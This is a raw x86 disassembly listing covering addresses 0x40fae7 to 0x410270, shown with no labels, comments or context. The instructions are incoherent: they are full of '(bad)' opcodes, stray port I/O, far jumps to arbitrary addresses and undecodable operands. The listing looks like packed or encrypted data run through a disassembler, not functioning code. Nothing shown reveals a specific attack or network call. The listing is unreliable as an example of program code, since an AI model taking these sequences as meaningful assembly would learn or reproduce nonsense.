  40fae7:	(bad)  
  40fae8:	pop    ecx
  40fae9:	es jmp 0x6202:0x361795b4
  40faf1:	xchg   esi,eax
  40faf2:	int3   
  40faf3:	cmp    eax,edi
  40faf5:	add    ebx,DWORD PTR [ecx-0xca53cc]
  40fafb:	loope  0x40faea
  40fafd:	adc    esp,ebx
  40faff:	outs   dx,BYTE PTR ds:[esi]
  40fb00:	leave  
  40fb01:	loopne 0x40fa89
  40fb03:	push   esi
  40fb04:	dec    edi
  40fb05:	out    0x26,al
  40fb07:	jns    0x40fb4d
  40fb09:	push   ebx
  40fb0a:	addr16 data16 stc 
  40fb0d:	in     eax,0x97
  40fb0f:	inc    ecx
  40fb10:	and    DWORD PTR [eax],ebp
  40fb12:	pushf  
  40fb13:	cmp    BYTE PTR [esi+0x68293a84],0x4
  40fb1a:	mov    ds:0x9b730f95,eax
  40fb1f:	push   cs
  40fb20:	add    DWORD PTR [edx-0x5afb3a19],eax
  40fb26:	stos   DWORD PTR es:[edi],eax
  40fb27:	(bad)  
  40fb29:	mov    al,BYTE PTR [esi+0x47c7cf3a]
  40fb2f:	lahf   
  40fb30:	mov    gs,WORD PTR [edi-0x37]
  40fb33:	in     al,dx
  40fb34:	sub    dh,bl
  40fb36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb37:	adc    al,0x81
  40fb39:	xor    al,0xd3
  40fb3b:	mov    bh,0x54
  40fb3d:	rcl    dl,0x1e
  40fb40:	icebp  
  40fb41:	sub    eax,0x3ea26634
  40fb46:	shr    esi,cl
  40fb48:	enter  0x6ac3,0x33
  40fb4c:	sbb    al,0xd1
  40fb4e:	ins    BYTE PTR es:[edi],dx
  40fb4f:	sub    ah,BYTE PTR [esi+0x6c]
  40fb52:	and    eax,0xbf62841e
  40fb57:	xor    edx,DWORD PTR [ecx-0x3a]
  40fb5a:	jnp    0x40fb30
  40fb5c:	mov    ah,0x3a
  40fb5e:	jmp    0x3f3f598d
  40fb63:	jmp    0x40fafa
  40fb65:	mov    dh,0x9d
  40fb67:	add    ecx,DWORD PTR [ebp-0x4a197715]
  40fb6d:	rol    BYTE PTR [edi+0x61],1
  40fb70:	loope  0x40fb7c
  40fb72:	pop    edx
  40fb73:	jl     0x40fbe1
  40fb75:	icebp  
  40fb76:	inc    ebp
  40fb77:	mov    al,fs:0x3646cd42
  40fb7d:	lock jno 0x40fb7d
  40fb80:	repz xlat BYTE PTR ds:[ebx]
  40fb82:	aas    
  40fb83:	pusha  
  40fb84:	aas    
  40fb85:	bound  edi,QWORD PTR [esi+ebx*4]
  40fb88:	jnp    0x40fb15
  40fb8a:	gs jb  0x40fb1a
  40fb8d:	dec    eax
  40fb8e:	xor    BYTE PTR [edx+0x15],0x6b
  40fb92:	clc    
  40fb93:	jle    0x40fbc1
  40fb95:	loopne 0x40fb4f
  40fb97:	cld    
  40fb98:	into   
  40fb99:	lods   eax,DWORD PTR ds:[esi]
  40fb9a:	jg     0x40fc14
  40fb9c:	inc    edx
  40fb9d:	mov    ebx,0x25a71b90
  40fba2:	mov    bl,0x58
  40fba4:	xor    ebx,edx
  40fba6:	cdq    
  40fba7:	aas    
  40fba8:	or     BYTE PTR [esi+0xf5753e5],dl
  40fbae:	push   ebx
  40fbaf:	das    
  40fbb0:	repnz dec ebx
  40fbb2:	push   ebx
  40fbb3:	cmp    al,0xa3
  40fbb5:	and    DWORD PTR [ecx-0x43c11f4a],0x0
  40fbbc:	pop    edx
  40fbbd:	sbb    eax,0xfe714026
  40fbc2:	je     0x40fb67
  40fbc4:	dec    ebp
  40fbc5:	pop    eax
  40fbc6:	inc    esp
  40fbc7:	inc    esi
  40fbc8:	pop    ss
  40fbc9:	push   ecx
  40fbca:	shl    BYTE PTR [eax+0x617adb96],1
  40fbd0:	fdiv   QWORD PTR [eax-0x7a]
  40fbd3:	repnz mov esp,0xf1427868
  40fbd9:	sub    BYTE PTR [ebx],ah
  40fbdb:	inc    eax
  40fbdc:	xlat   BYTE PTR ds:[ebx]
  40fbdd:	xchg   DWORD PTR [edx+eax*4-0x6b],eax
  40fbe1:	fld    QWORD PTR [edi]
  40fbe3:	faddp  st(5),st
  40fbe5:	mov    ebx,0x7b7a6394
  40fbea:	add    dl,BYTE PTR [edx+0x6c714776]
  40fbf0:	xchg   BYTE PTR [ebx-0x4175f85],bl
  40fbf6:	jne    0x40fbd6
  40fbf8:	xor    ebp,esp
  40fbfa:	aaa    
  40fbfb:	add    esp,0x5b
  40fbfe:	mov    bl,BYTE PTR [esi]
  40fc00:	das    
  40fc01:	cs jo  0x40fba2
  40fc04:	xlat   BYTE PTR ds:[ebx]
  40fc05:	repnz addr16 enter 0x6593,0xa7
  40fc0b:	sahf   
  40fc0c:	sbb    DWORD PTR [ebx+ebx*1+0x78b97ef6],esi
  40fc13:	ret    
  40fc14:	neg    BYTE PTR [ebx+0x797527fa]
  40fc1a:	in     al,dx
  40fc1b:	test   DWORD PTR es:[edx+0x19804cc7],eax
  40fc22:	adc    BYTE PTR [esi+0x419a69cf],0x60
  40fc29:	imul   edx,DWORD PTR [eax+0x7579058e],0xcf8b897
  40fc33:	or     DWORD PTR [ebx],ebp
  40fc35:	js     0x40fc77
  40fc37:	xchg   edi,eax
  40fc38:	(bad)  
  40fc39:	sti    
  40fc3a:	inc    ecx
  40fc3b:	dec    esp
  40fc3c:	in     eax,0x1e
  40fc3e:	mov    eax,0xc0091d7f
  40fc43:	adc    eax,0x2ff19944
  40fc48:	pop    es
  40fc49:	push   0xb
  40fc4b:	xor    edi,DWORD PTR ds:0xafba75d9
  40fc51:	imul   ebp,ebp,0x63426759
  40fc57:	xlat   BYTE PTR gs:[ebx]
  40fc59:	clc    
  40fc5a:	popa   
  40fc5b:	pop    ss
  40fc5c:	(bad)  
  40fc5d:	jl     0x40fcbe
  40fc5f:	jge    0x5b933302
  40fc65:	nop
  40fc66:	adc    bh,dl
  40fc68:	cld    
  40fc69:	(bad)  
  40fc6a:	adc    eax,0xddddc4eb
  40fc6f:	add    BYTE PTR [edx+eiz*1],bl
  40fc72:	or     dl,BYTE PTR [edi]
  40fc74:	sbb    DWORD PTR [esi],esi
  40fc76:	xor    BYTE PTR [esi-0x44],bh
  40fc79:	das    
  40fc7a:	mov    ah,BYTE PTR [esi]
  40fc7c:	iret   
  40fc7d:	jns    0x40fcda
  40fc7f:	mov    cl,0xe8
  40fc81:	arpl   WORD PTR [eax-0x23],si
  40fc84:	jo     0x40fc3d
  40fc86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc87:	ss scas al,BYTE PTR es:[edi]
  40fc89:	ret    0xd2d4
  40fc8c:	je     0x40fcd2
  40fc8e:	mov    ebx,esi
  40fc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc91:	xchg   edx,eax
  40fc92:	xor    BYTE PTR [edx+0x74],bh
  40fc95:	or     eax,0x8eabf1c0
  40fc9a:	out    0xb3,al
  40fc9c:	lods   al,BYTE PTR ds:[esi]
  40fc9d:	outs   dx,BYTE PTR ds:[esi]
  40fc9e:	cmp    ebp,DWORD PTR [esp+eax*1-0x20]
  40fca2:	adc    edi,eax
  40fca4:	test   DWORD PTR [esi+0x4f],esi
  40fca7:	ss enter 0x719a,0x12
  40fcac:	aam    0x94
  40fcae:	pop    ss
  40fcaf:	cmp    DWORD PTR [eax-0x22],esp
  40fcb2:	ret    0xe449
  40fcb5:	xor    eax,0x6b0d2d85
  40fcba:	pop    ss
  40fcbb:	fcmovbe st,st(5)
  40fcbd:	ins    DWORD PTR es:[edi],dx
  40fcbe:	cld    
  40fcbf:	mov    ds:0x38ab8dd6,eax
  40fcc4:	mov    BYTE PTR [edi+0x26],cl
  40fcc7:	inc    eax
  40fcc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc9:	mov    WORD PTR [edi+0x3b],?
  40fccc:	mov    dl,0xb7
  40fcce:	cdq    
  40fccf:	sbb    eax,0x764937bd
  40fcd4:	mov    edi,0xb0b50fa9
  40fcd9:	mov    ds:0xcdc1eed,eax
  40fcde:	mov    dl,0x38
  40fce0:	ret    0xd0a0
  40fce3:	jnp    0x40fcd8
  40fce5:	adc    ecx,DWORD PTR [edx-0xfe46282]
  40fceb:	out    dx,al
  40fcec:	stos   WORD PTR es:[edi],ax
  40fcee:	in     al,dx
  40fcef:	dec    esi
  40fcf0:	sub    eax,0x778edbf
  40fcf5:	mov    ds:0xe84d57a2,eax
  40fcfa:	adc    DWORD PTR [esi],esi
  40fcfc:	jmp    0x40fcb0
  40fcfe:	add    ch,al
  40fd00:	lahf   
  40fd01:	cli    
  40fd02:	jmp    0x40fcec
  40fd04:	mov    al,ds:0x765367cb
  40fd09:	aam    0x46
  40fd0b:	shr    DWORD PTR [ecx-0x5e],cl
  40fd0e:	test   eax,0xbb36e9c7
  40fd13:	add    BYTE PTR [edx-0x1d],0xd6
  40fd17:	ror    BYTE PTR [eax+0x57347638],1
  40fd1d:	sub    BYTE PTR [eax+0x69],ch
  40fd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd21:	ins    BYTE PTR es:[edi],dx
  40fd22:	dec    ebx
  40fd23:	dec    ecx
  40fd24:	xor    ecx,DWORD PTR [edi+0x5bed00b0]
  40fd2a:	push   ebx
  40fd2b:	jle    0x40fd13
  40fd2d:	loop   0x40fcec
  40fd2f:	das    
  40fd30:	pop    edx
  40fd31:	and    ecx,0xc88bc16c
  40fd37:	in     al,dx
  40fd38:	mov    ds:0x244f7372,eax
  40fd3d:	and    ah,BYTE PTR [eax-0x6bc99b30]
  40fd43:	repz cli 
  40fd45:	dec    esp
  40fd46:	mov    WORD PTR [esi],gs
  40fd48:	xor    DWORD PTR [ebx+eax*4+0x3637a6f8],esp
  40fd4f:	inc    edx
  40fd50:	ror    DWORD PTR [ecx+0x760690bd],0xaf
  40fd57:	pop    eax
  40fd58:	push   ebx
  40fd59:	xchg   edx,eax
  40fd5a:	popf   
  40fd5b:	add    DWORD PTR [ecx+0x26],edi
  40fd5e:	pop    esi
  40fd5f:	adc    eax,0x4f34308c
  40fd64:	jbe    0x40fd4c
  40fd66:	lock or DWORD PTR [ebx-0x72c011a5],ecx
  40fd6d:	and    BYTE PTR [edx+0xf],0x4f
  40fd71:	cmp    al,0xce
  40fd73:	loop   0x40fde7
  40fd75:	daa    
  40fd76:	cli    
  40fd77:	jg     0x40fd89
  40fd79:	sub    eax,0x1659ddd4
  40fd7e:	sub    BYTE PTR [edi+0x1],cl
  40fd81:	jae    0x40fd6e
  40fd83:	dec    ebx
  40fd84:	and    al,0x2d
  40fd86:	push   ebx
  40fd87:	jmp    0x529304f5
  40fd8c:	push   edx
  40fd8d:	stos   BYTE PTR es:[edi],al
  40fd8e:	and    al,0xfc
  40fd90:	ret    0x7306
  40fd93:	mov    edi,0xd5bed1a0
  40fd98:	retf   
  40fd99:	lods   eax,DWORD PTR ds:[esi]
  40fd9a:	sub    eax,0xb7ef0e59
  40fd9f:	call   0x6f6:0x8848b67c
  40fda6:	inc    esp
  40fda7:	fisub  DWORD PTR [eax-0x6a]
  40fdab:	adc    eax,0x3243fd41
  40fdb0:	ins    DWORD PTR es:[edi],dx
  40fdb1:	nop
  40fdb2:	and    edi,DWORD PTR [ebx+0x76]
  40fdb5:	stos   DWORD PTR es:[edi],eax
  40fdb6:	outs   dx,BYTE PTR ds:[esi]
  40fdb7:	xor    BYTE PTR [esi],0xa2
  40fdba:	mov    ch,0x64
  40fdbc:	push   cs
  40fdbd:	lods   eax,DWORD PTR ds:[esi]
  40fdbe:	jmp    0x8e58:0x17cb7064
  40fdc5:	inc    esp
  40fdc6:	inc    ebp
  40fdc7:	mov    ds:0x677bc48d,eax
  40fdcc:	pop    ss
  40fdcd:	popa   
  40fdce:	jb     0x40fe2d
  40fdd0:	dec    esp
  40fdd1:	(bad)  
  40fdd2:	data16 sbb BYTE PTR [ecx-0x1f],ah
  40fdd6:	aad    0x43
  40fdd8:	repz lahf 
  40fdda:	outs   dx,DWORD PTR ds:[esi]
  40fddb:	aam    0x25
  40fddd:	xchg   esp,eax
  40fdde:	std    
  40fddf:	retf   
  40fde0:	icebp  
  40fde1:	(bad)  
  40fde2:	les    ebp,FWORD PTR [ebp-0xf]
  40fde5:	adc    DWORD PTR [edx+0x31],0xffffffe7
  40fde9:	jns    0x40fd9f
  40fdeb:	mov    esp,0x8f57bf70
  40fdf0:	or     bh,BYTE PTR [ebp-0x52]
  40fdf3:	ror    DWORD PTR [ecx],0x93
  40fdf6:	mov    ds:0xe74e2756,eax
  40fdfb:	aam    0xa7
  40fdfd:	xchg   BYTE PTR [ecx],ah
  40fdff:	lea    ebx,[ebx+edx*2]
  40fe02:	test   al,0x2
  40fe04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe05:	mov    bl,0x7c
  40fe07:	pop    edx
  40fe08:	ins    DWORD PTR es:[edi],dx
  40fe09:	adc    DWORD PTR [esi+0x7a382f55],0x2e1479fd
  40fe13:	or     BYTE PTR [edx+edx*8-0xf],dh
  40fe17:	loope  0x40fdfe
  40fe19:	retf   0x4a56
  40fe1c:	fidiv  DWORD PTR [edx]
  40fe1e:	and    ch,BYTE PTR [edx]
  40fe20:	and    BYTE PTR [esi-0x68],dl
  40fe23:	adc    DWORD PTR [ebx-0xe4fd0b8],edx
  40fe29:	and    DWORD PTR [ebx-0x2],eax
  40fe2c:	mov    BYTE PTR [edi+ebx*4+0x52f434c3],bh
  40fe33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe34:	jbe    0x40fdcc
  40fe36:	sbb    edx,ecx
  40fe38:	test   al,0x97
  40fe3a:	pop    edx
  40fe3b:	sbb    DWORD PTR [bx+di+0x4e5e],ecx
  40fe40:	push   edx
  40fe41:	dec    esp
  40fe42:	xchg   BYTE PTR [edi-0x17abefc0],ch
  40fe48:	pop    ecx
  40fe49:	pop    ebp
  40fe4a:	clc    
  40fe4b:	jne    0x40fe66
  40fe4d:	fwait
  40fe4e:	mov    BYTE PTR [eax+0x27b6f628],dh
  40fe54:	inc    ecx
  40fe55:	mov    WORD PTR [ecx],fs
  40fe57:	dec    ebx
  40fe58:	test   DWORD PTR [esi-0x3],0xe5aac23
  40fe5f:	rcr    BYTE PTR [ebx-0x5a7c3855],1
  40fe65:	inc    edi
  40fe66:	sub    eax,0x62f88ed8
  40fe6b:	fwait
  40fe6c:	fs mov dl,0xf
  40fe6f:	pop    es
  40fe70:	jo     0x40fec0
  40fe72:	push   eax
  40fe73:	enter  0xd0c3,0x86
  40fe77:	lea    edx,[ecx]
  40fe79:	not    DWORD PTR [ebp+0x57]
  40fe7c:	inc    ebp
  40fe7d:	xor    eax,DWORD PTR [ebx+edx*8]
  40fe80:	retf   
  40fe81:	or     bp,dx
  40fe84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe85:	jecxz  0x40fe58
  40fe87:	leave  
  40fe88:	mov    cs,ebp
  40fe8a:	inc    edx
  40fe8b:	or     al,BYTE PTR [ebx+0x64]
  40fe8e:	fsubr  st,st(6)
  40fe90:	cvtps2pd xmm0,QWORD PTR [ebp+ecx*8+0x70]
  40fe95:	pop    edx
  40fe96:	or     eax,0x41f79aaa
  40fe9b:	aas    
  40fe9c:	inc    ecx
  40fe9d:	mov    DWORD PTR [ecx-0x659b2be3],ecx
  40fea3:	aaa    
  40fea4:	jmp    0x40fe44
  40fea6:	pushf  
  40fea7:	shl    BYTE PTR [esi+0x14b62578],1
  40fead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feae:	pop    edi
  40feaf:	inc    ebp
  40feb0:	repnz shl bh,0xdf
  40feb4:	aam    0x18
  40feb6:	stos   BYTE PTR es:[edi],al
  40feb7:	jmp    0x40ff1a
  40feb9:	imul   esp,DWORD PTR [ebp+0x20],0x3b914309
  40fec0:	xchg   ebp,eax
  40fec2:	pop    es
  40fec3:	rcr    BYTE PTR [edi-0x49],cl
  40fec6:	jle    0x40fe73
  40fec8:	jle    0x40ff03
  40feca:	jmp    0x6925486b
  40fecf:	xchg   esi,eax
  40fed0:	mov    esi,0xb965f26b
  40fed5:	mov    fs,esi
  40fed7:	(bad)  [ebx+0x75]
  40feda:	push   0xf582e144
  40fedf:	mov    ds:0x72005477,eax
  40fee4:	cmp    WORD PTR ds:0xb5b1409e,cx
  40feeb:	mov    BYTE PTR [ebp+0xcb64c9a],0x55
  40fef2:	popf   
  40fef3:	(bad)  
  40fef4:	or     edi,DWORD PTR [eax-0x10]
  40fef7:	or     ebx,esp
  40fef9:	mov    WORD PTR [ecx],es
  40fefb:	leave  
  40fefc:	aaa    
  40fefd:	xchg   esi,eax
  40fefe:	in     al,dx
  40feff:	dec    edx
  40ff00:	aam    0xa2
  40ff02:	xchg   esi,eax
  40ff03:	cmp    al,0x1c
  40ff05:	call   0x160db2ae
  40ff0a:	xchg   esp,eax
  40ff0b:	add    DWORD PTR [eax-0x5315d74c],0xd9daaf7c
  40ff15:	daa    
  40ff16:	call   0xa689f179
  40ff1b:	jns    0x40fe9f
  40ff1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff1e:	jbe    0x40ff93
  40ff20:	mov    bh,0xc
  40ff22:	adc    dh,0xdf
  40ff25:	sbb    dh,bl
  40ff27:	mov    bl,ah
  40ff29:	xchg   esp,eax
  40ff2a:	dec    ebp
  40ff2b:	push   ds
  40ff2c:	clc    
  40ff2d:	enter  0x3585,0x40
  40ff31:	add    DWORD PTR [ebx-0x48efaa5a],ecx
  40ff37:	cli    
  40ff38:	inc    esi
  40ff39:	pop    es
  40ff3a:	ds in  al,0x8b
  40ff3d:	aas    
  40ff3e:	fsub   QWORD PTR [eax-0x321c78ba]
  40ff44:	stc    
  40ff45:	cmc    
  40ff46:	inc    ebx
  40ff47:	xchg   BYTE PTR [si],al
  40ff4a:	xchg   ecx,eax
  40ff4b:	mov    ds:0xb0061caf,eax
  40ff50:	out    0x66,al
  40ff52:	in     eax,0x55
  40ff54:	mov    eax,0x93cd51f4
  40ff59:	dec    esp
  40ff5a:	in     al,dx
  40ff5b:	mov    eax,ds:0x89ceabea
  40ff60:	imul   ebp,DWORD PTR [ecx+0x53544497],0x60
  40ff67:	sub    al,0x28
  40ff69:	imul   esp,eax,0x8f9b43c0
  40ff6f:	push   ebp
  40ff70:	pop    ebp
  40ff71:	fild   WORD PTR [ebx]
  40ff73:	fadd   QWORD PTR [edx+0x7ad3d828]
  40ff79:	arpl   WORD PTR [esi],bx
  40ff7b:	xchg   DWORD PTR [edi],eax
  40ff7d:	(bad)  
  40ff7e:	popf   
  40ff7f:	or     DWORD PTR [eax],ebp
  40ff81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff82:	pop    eax
  40ff83:	cmp    ebx,DWORD PTR [edx-0x6b9eda19]
  40ff89:	ins    DWORD PTR es:[edi],dx
  40ff8a:	add    BYTE PTR [edx],0x22
  40ff8d:	in     eax,0xcc
  40ff8f:	aam    0x60
  40ff91:	add    ebx,esi
  40ff93:	mov    edi,0xf0b3f3cf
  40ff98:	cdq    
  40ff99:	mov    ecx,0x144c536b
  40ff9e:	xchg   ebx,eax
  40ff9f:	(bad)  
  40ffa0:	push   ebp
  40ffa1:	mov    eax,ds:0x3f934ae1
  40ffa6:	sbb    dh,al
  40ffa8:	aad    0x9b
  40ffaa:	dec    ecx
  40ffab:	in     eax,0x5
  40ffad:	je     0x40ff39
  40ffaf:	loop   0x40ff77
  40ffb1:	sub    dl,BYTE PTR [esi-0xdbd132]
  40ffb7:	cmp    al,0x64
  40ffb9:	jae    0x40ffa5
  40ffbb:	dec    esi
  40ffbc:	test   eax,0x163c6870
  40ffc1:	mov    eax,ds:0x2c95edcb
  40ffc6:	aas    
  40ffc7:	inc    ebx
  40ffc8:	adc    dh,BYTE PTR [esi+esi*8-0x5a]
  40ffcc:	add    BYTE PTR [edx+eax*8],0xc3
  40ffd0:	sti    
  40ffd1:	mov    WORD PTR [eax],?
  40ffd3:	fistp  QWORD PTR [eax-0x76]
  40ffd6:	mov    ds:0x711b2458,al
  40ffdb:	les    ecx,FWORD PTR [edx]
  40ffdd:	rcr    BYTE PTR [esi-0x61c769f2],1
  40ffe3:	mov    esi,0x2a1d5cd2
  40ffe8:	rol    BYTE PTR [edi],0xfd
  40ffeb:	mov    ah,BYTE PTR [edx]
  40ffed:	mov    BYTE PTR [esi+0x2925ce9d],dh
  40fff3:	cmp    bl,BYTE PTR [edi-0xfcf4158]
  40fff9:	loope  0x40ffbf
  40fffb:	jcxz   0x40ff85
  40fffe:	rcl    BYTE PTR [eax-0x4bb6d4e3],0xe2
  410005:	cs jp  0x40ffd0
  410008:	loope  0x40fff7
  41000a:	adc    al,0xcb
  41000c:	nop
  41000d:	ja     0x410081
  41000f:	call   0xaa853e1d
  410014:	mov    DWORD PTR [esi-0x74757f2d],ecx
  41001a:	jbe    0x40ffc5
  41001c:	jb     0x410032
  41001e:	daa    
  41001f:	fcomp  QWORD PTR ds:0x56c8afd9
  410025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410026:	dec    esp
  410027:	dec    esp
  410028:	sbb    al,0xe6
  41002a:	ds inc ebp
  41002c:	xchg   ebx,eax
  41002d:	outs   dx,BYTE PTR ds:[esi]
  41002e:	retf   
  41002f:	add    al,ah
  410031:	lock ret 
  410033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410034:	xchg   esi,eax
  410035:	jae    0x40ffe9
  410037:	or     DWORD PTR [edi+0x2cbd1b12],ebp
  41003d:	into   
  41003e:	xchg   edx,eax
  41003f:	popf   
  410040:	stos   DWORD PTR es:[edi],eax
  410041:	sahf   
  410042:	out    dx,al
  410043:	outs   dx,DWORD PTR ds:[esi]
  410044:	pop    esi
  410045:	xor    ebp,DWORD PTR [esi+0x2473f61f]
  41004b:	add    al,0xb2
  41004d:	int    0x5f
  41004f:	es loop 0x410054
  410052:	imul   edx,DWORD PTR [ebp+0x19],0x37
  410056:	in     al,dx
  410057:	inc    ebx
  410058:	(bad)  
  410059:	nop
  41005a:	bound  ecx,QWORD PTR [eax]
  41005c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41005d:	xchg   ebp,eax
  41005e:	sbb    al,0x6b
  410060:	jecxz  0x41007d
  410062:	mov    WORD PTR [ebx],ss
  410064:	test   al,0x49
  410066:	xchg   DWORD PTR [ebp+0x59],edx
  410069:	scas   eax,DWORD PTR es:[edi]
  41006a:	bnd call 0x729e2e06
  410070:	cwde   
  410071:	es jecxz 0x4100cb
  410074:	enter  0x43ca,0xdc
  410078:	ret    
  410079:	addr16 dec esp
  41007b:	sahf   
  41007c:	adc    al,0xad
  41007e:	inc    ebp
  41007f:	pop    ebp
  410080:	jle    0x410090
  410082:	mov    WORD PTR ds:0x4565dac9,gs
  410088:	cmp    DWORD PTR [esi+edi*4],esi
  41008b:	inc    esp
  41008c:	sar    al,0xb8
  41008f:	mov    ch,0xd2
  410091:	out    dx,eax
  410092:	loope  0x4100d9
  410094:	sti    
  410095:	and    al,0xaa
  410097:	mov    al,ds:0xf2155f25
  41009c:	dec    BYTE PTR [edi+0x2df08317]
  4100a2:	aad    0x4c
  4100a4:	jmp    0xc31c848d
  4100a9:	pop    esi
  4100aa:	stos   BYTE PTR es:[edi],al
  4100ab:	push   ebx
  4100ac:	pop    ebp
  4100ad:	xor    eax,0xda502eb5
  4100b2:	mov    dl,0xaf
  4100b4:	push   esp
  4100b5:	jg     0x410078
  4100b7:	adc    esi,0xffffffde
  4100ba:	call   DWORD PTR [edx]
  4100bc:	ins    DWORD PTR es:[edi],dx
  4100bd:	mov    ebp,0x742bce5d
  4100c2:	adc    eax,0xdf206b0f
  4100c7:	shl    DWORD PTR [edi+0x41],0x67
  4100cb:	cmp    eax,0x5c692fc
  4100d0:	dec    esp
  4100d1:	sbb    ah,BYTE PTR [esi-0x1]
  4100d4:	outs   dx,DWORD PTR ds:[esi]
  4100d5:	aas    
  4100d6:	sub    dh,0xa9
  4100d9:	or     esi,ebp
  4100db:	(bad)  
  4100dc:	pop    ds
  4100dd:	xlat   BYTE PTR ds:[ebx]
  4100de:	ins    DWORD PTR es:[edi],dx
  4100df:	mov    ebx,0x2be8478c
  4100e4:	and    eax,0x17e4f55c
  4100e9:	jo     0x410112
  4100eb:	or     ebp,DWORD PTR ds:0x72926731
  4100f1:	inc    edx
  4100f2:	lock retf 
  4100f4:	pop    edx
  4100f5:	std    
  4100f6:	mov    ds:0x90237241,eax
  4100fb:	cmp    ch,BYTE PTR [eax-0x15110849]
  410101:	sti    
  410102:	sti    
  410103:	add    edi,DWORD PTR [esi]
  410105:	repnz sahf 
  410107:	and    BYTE PTR [esi],al
  410109:	cs jmp 0x3960f7f4
  41010f:	mov    bh,0xb4
  410111:	and    eax,0x490abba0
  410116:	mov    ch,0x7b
  410118:	dec    ebp
  410119:	xchg   ebx,eax
  41011a:	xor    DWORD PTR [ebp-0x1121e782],edi
  410120:	imul   esi,DWORD PTR [esi],0xdeb38f49
  410126:	or     eax,0xc9d3a47d
  41012b:	popf   
  41012c:	retf   
  41012d:	push   esp
  41012e:	shl    DWORD PTR [edi+0x67],1
  410131:	sbb    bl,BYTE PTR [edi+ebp*4-0x104cbd51]
  410138:	xchg   ebx,eax
  410139:	popa   
  41013a:	hlt    
  41013b:	leave  
  41013c:	icebp  
  41013d:	cmp    al,BYTE PTR [ecx+0x54081d37]
  410143:	cdq    
  410144:	dec    ebx
  410145:	and    al,0x7b
  410147:	xchg   ebp,eax
  410148:	cwde   
  410149:	jbe    0x410161
  41014b:	add    al,ch
  41014d:	rcr    BYTE PTR [ebx+0x72],cl
  410150:	pop    ss
  410151:	pop    ebp
  410152:	cs push es
  410154:	adc    bh,BYTE PTR es:[esi]
  410157:	sbb    eax,0xea2026d1
  41015c:	ss mov dh,0xa4
  41015f:	jns    0x410115
  410161:	pushf  
  410162:	or     DWORD PTR [ebp-0x21288751],ecx
  410168:	fadd   QWORD PTR [ebx-0x65]
  41016b:	jae    0x410117
  41016d:	stos   DWORD PTR es:[edi],eax
  41016e:	xor    dh,0xea
  410171:	shr    DWORD PTR [esi],0x0
  410174:	cwde   
  410175:	mov    WORD PTR [esi],ss
  410177:	xchg   ebx,eax
  410178:	loop   0x4101d3
  41017a:	sahf   
  41017b:	iret   
  41017c:	fwait
  41017d:	or     al,0x89
  41017f:	gs mov ebx,0x24340dd3
  410185:	mov    ecx,0x551e2609
  41018a:	inc    ebx
  41018b:	retf   
  41018c:	push   ds
  41018d:	or     eax,0x4b638379
  410192:	and    eax,0xaabb792e
  410197:	pop    edx
  410198:	(bad)  
  41019a:	(bad)  
  41019b:	and    eax,0xce69ce5b
  4101a0:	stc    
  4101a1:	imul   esi,DWORD PTR [eax+0x2],0xf95c0f3a
  4101a8:	jmp    0x41012d
  4101aa:	xor    DWORD PTR [edi+0x4afd779],ebp
  4101b0:	add    esp,DWORD PTR [ebx]
  4101b2:	(bad)
  4101b5:	shl    esi,cl
  4101b7:	or     cl,cl
  4101b9:	dec    edx
  4101ba:	pop    edx
  4101bb:	sbb    bl,al
  4101bd:	push   esi
  4101be:	lods   eax,DWORD PTR ds:[esi]
  4101bf:	std    
  4101c0:	inc    DWORD PTR [edx-0x50a6fc3c]
  4101c6:	cmp    al,0x42
  4101c8:	lock hlt 
  4101ca:	and    DWORD PTR [edx+0x700c378d],ebx
  4101d0:	js     0x41017a
  4101d2:	nop
  4101d3:	stos   DWORD PTR es:[edi],eax
  4101d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101d5:	mov    eax,ds:0xb718a952
  4101da:	inc    ecx
  4101db:	or     bl,ah
  4101dd:	repz (bad) 
  4101df:	jmp    0xe8ce4971
  4101e4:	mov    eax,ds:0x3da395a2
  4101e9:	mov    al,ds:0x4c29a407
  4101ee:	out    0x88,al
  4101f0:	repnz shr DWORD PTR [ebx],cl
  4101f3:	retf   0xc9f2
  4101f6:	lds    esi,FWORD PTR [edi]
  4101f8:	add    eax,0x1a8c9d87
  4101fd:	mov    ds:0x70e492cb,al
  410202:	test   DWORD PTR [edx-0x6f],eax
  410205:	mov    WORD PTR [ebx-0x19602013],cs
  41020b:	loop   0x41025f
  41020d:	imul   esi,esp,0xc2e72df2
  410213:	repnz inc ecx
  410215:	jb     0x4101c0
  410217:	cdq    
  410218:	test   eax,0x83522730
  41021d:	shl    BYTE PTR [esp+edi*2+0x19],cl
  410221:	or     al,0x7f
  410223:	mov    gs,WORD PTR [eax-0x1e]
  410226:	inc    edx
  410227:	ds sti 
  410229:	cmp    cl,BYTE PTR [eax-0x19c0f3f6]
  41022f:	dec    ecx
  410230:	fs aam 0xfd
  410233:	adc    eax,0x534f3da
  410238:	ficom  DWORD PTR [eax-0x13]
  41023b:	pop    es
  41023c:	cmp    eax,0x35d1c642
  410241:	pop    esp
  410242:	ret    0xf6dc
  410245:	pop    ds
  410246:	pop    eax
  410247:	lods   eax,DWORD PTR ds:[esi]
  410248:	sub    DWORD PTR [esp+eax*4],ecx
  41024b:	sahf   
  41024c:	(bad)  
  41024d:	adc    bl,bl
  41024f:	xchg   esi,eax
  410250:	pushf  
  410251:	leave  
  410252:	ins    DWORD PTR es:[edi],dx
  410253:	repnz test esi,ebx
  410256:	push   esp
  410257:	jle    0x4102a7
  410259:	xchg   DWORD PTR [eax+0x6d399e29],edi
  41025f:	stos   BYTE PTR es:[edi],al
  410260:	pusha  
  410261:	mov    eax,0x853ca5d1
  410266:	fist   DWORD PTR [ebx-0x50]
  410269:	mov    ds,esp
  41026b:	push   0x990fcdf5
  410270:	or     al,0x2b
